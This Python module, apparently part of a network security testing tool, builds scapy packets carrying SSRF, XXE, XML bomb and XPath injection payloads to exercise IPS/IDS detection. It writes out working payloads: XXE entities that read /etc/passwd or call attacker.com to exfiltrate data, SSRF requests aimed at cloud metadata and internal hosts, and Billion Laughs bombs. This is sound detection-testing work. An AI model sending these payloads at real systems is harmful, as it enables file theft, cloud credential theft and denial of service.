"""SSRF and XXE attack pattern traffic module."""

import random
from typing import Iterator

from scapy.layers.inet import IP, TCP
from scapy.packet import Packet, Raw

from netsec_tester.modules.base import ModuleInfo, TrafficCategory, TrafficModule


# SSRF target patterns (internal IP addresses)
SSRF_TARGETS = [
    "127.0.0.1",
    "localhost",
    "0.0.0.0",
    "169.254.169.254",  # AWS metadata
    "metadata.google.internal",  # GCP metadata
    "10.0.0.1",
    "172.16.0.1",
    "192.168.1.1",
    "[::1]",  # IPv6 localhost
    "0177.0.0.1",  # Octal encoding
    "2130706433",  # Decimal encoding of 127.0.0.1
    "0x7f.0x0.0x0.0x1",  # Hex encoding
]

# XXE payloads
XXE_PAYLOADS = [
    # Basic XXE
    '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>''',
    # XXE with parameter entity
    '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>test</foo>''',
    # Blind XXE
    '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/?data=test">
]>
<foo>&xxe;</foo>''',
    # XXE via XInclude
    '''<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>''',
    # XXE with CDATA
    '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo><![CDATA[&xxe;]]></foo>''',
]

# XML Bomb patterns (Billion Laughs)
XML_BOMBS = [
    '''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>''',
    # Quadratic blowup
    '''<?xml version="1.0"?>
<!DOCTYPE kaboom [
  <!ENTITY a "''' + "A" * 100 + '''">
]>
<kaboom>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</kaboom>''',
]

# XPath injection payloads
XPATH_PAYLOADS = [
    "' or '1'='1",
    "' or ''='",
    "1 or 1=1",
    "admin' or '1'='1",
    "') or ('1'='1",
    "' or 1=1 or '",
    "//user[name='admin']/password",
    "/*",
    "string(//user[1]/password)",
]


class SSRFXXEModule(TrafficModule):
    """Traffic module for SSRF and XXE attack patterns.

    Generates traffic that mimics server-side request forgery
    and XML external entity injection attacks.
    """

    def __init__(self) -> None:
        """Initialize the SSRF/XXE module."""
        self._attack_count = 0

    def get_info(self) -> ModuleInfo:
        """Return module information."""
        return ModuleInfo(
            name="ssrf_xxe",
            description="SSRF, XXE, XML bombs, and XPath injection patterns",
            category=TrafficCategory.IPS_IDS,
            protocols=["TCP"],
            ports=[80, 443, 8080],
        )

    def _generate_ssrf_url_param(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate SSRF via URL parameter."""
        target = random.choice(SSRF_TARGETS)

        # Common SSRF parameter names
        params = ["url", "link", "src", "redirect", "dest", "uri", "path", "file", "page", "goto"]
        param = random.choice(params)

        paths = [
            f"/fetch?{param}=http://{target}/",
            f"/proxy?{param}=http://{target}:22/",
            f"/api/download?{param}=http://{target}/admin",
            f"/image?{param}=http://{target}/internal",
            f"/redirect?{param}=http://{target}:8080/",
            f"/load?{param}=file:///etc/passwd",
            f"/import?{param}=gopher://{target}:6379/_INFO",
        ]

        path = random.choice(paths)
        http_request = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"Accept: */*\r\n"
            f"\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def _generate_ssrf_post_body(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate SSRF via POST body."""
        target = random.choice(SSRF_TARGETS)

        post_bodies = [
            f'{{"url": "http://{target}/"}}',
            f'{{"webhook": "http://{target}:8080/callback"}}',
            f'{{"image_url": "http://{target}/evil.jpg"}}',
            f'url=http://{target}/&action=fetch',
            f'<request><url>http://{target}/</url></request>',
        ]

        body = random.choice(post_bodies)
        content_type = "application/json" if body.startswith("{") else "application/x-www-form-urlencoded"
        if body.startswith("<"):
            content_type = "application/xml"

        http_request = (
            f"POST /api/fetch HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"Content-Type: {content_type}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"\r\n"
            f"{body}"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def _generate_xxe_attack(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate XXE injection attack."""
        payload = random.choice(XXE_PAYLOADS)

        http_request = (
            f"POST /api/parse HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"Content-Type: application/xml\r\n"
            f"Content-Length: {len(payload)}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"\r\n"
            f"{payload}"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def _generate_xml_bomb(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate XML bomb attack (Billion Laughs)."""
        payload = random.choice(XML_BOMBS)

        http_request = (
            f"POST /api/xml HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"Content-Type: application/xml\r\n"
            f"Content-Length: {len(payload)}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"\r\n"
            f"{payload}"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def _generate_xpath_injection(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate XPath injection attack."""
        payload = random.choice(XPATH_PAYLOADS)

        # URL encode special characters
        import urllib.parse
        encoded_payload = urllib.parse.quote(payload)

        http_request = (
            f"GET /search?user={encoded_payload} HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"Accept: */*\r\n"
            f"\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def _generate_ssrf_header(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate SSRF via HTTP headers."""
        target = random.choice(SSRF_TARGETS)

        # SSRF via various headers
        headers = [
            f"X-Forwarded-Host: {target}",
            f"X-Original-URL: http://{target}/",
            f"X-Rewrite-URL: http://{target}/admin",
            f"Referer: http://{target}/",
            f"X-Custom-IP-Authorization: {target}",
        ]

        header = random.choice(headers)
        http_request = (
            f"GET /api/callback HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"{header}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def generate_packets(
        self,
        src_ip: str,
        dst_ip: str,
        dst_port: int | None = None,
    ) -> Iterator[Packet]:
        """Generate SSRF/XXE pattern packets.

        Args:
            src_ip: Source IP address
            dst_ip: Destination IP address
            dst_port: Destination port

        Yields:
            Scapy packets with SSRF/XXE patterns
        """
        port = dst_port or 80
        self._attack_count += 1

        # Rotate through different attack types
        attack_type = self._attack_count % 6

        if attack_type == 0:
            yield from self._generate_ssrf_url_param(src_ip, dst_ip, port)
        elif attack_type == 1:
            yield from self._generate_ssrf_post_body(src_ip, dst_ip, port)
        elif attack_type == 2:
            yield from self._generate_xxe_attack(src_ip, dst_ip, port)
        elif attack_type == 3:
            yield from self._generate_xml_bomb(src_ip, dst_ip, port)
        elif attack_type == 4:
            yield from self._generate_xpath_injection(src_ip, dst_ip, port)
        else:
            yield from self._generate_ssrf_header(src_ip, dst_ip, port)

